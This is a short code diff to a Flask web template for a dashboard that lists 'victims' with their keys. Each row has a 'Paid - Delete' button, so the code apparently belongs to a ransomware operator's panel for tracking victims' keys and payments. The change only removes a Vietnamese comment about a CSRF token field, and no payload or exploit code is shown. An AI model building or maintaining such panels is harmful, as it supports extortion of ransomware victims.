@@ -188,7 +188,6 @@ def dashboard():
                     <td><pre style="margin:0;">{{ v.key }}</pre></td>
                     <td>
                         <form method="post" action="{{ url_for('delete_victim_route') }}" onsubmit="return confirm('Delete victim {{ v.id }}?');">
-                            <!-- THAY ĐỔI: Thêm trường ẩn chứa token CSRF -->
                             <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
                             <input type="hidden" name="victim_id" value="{{ v.id }}">
                             <button type="submit">Paid - Delete</button>
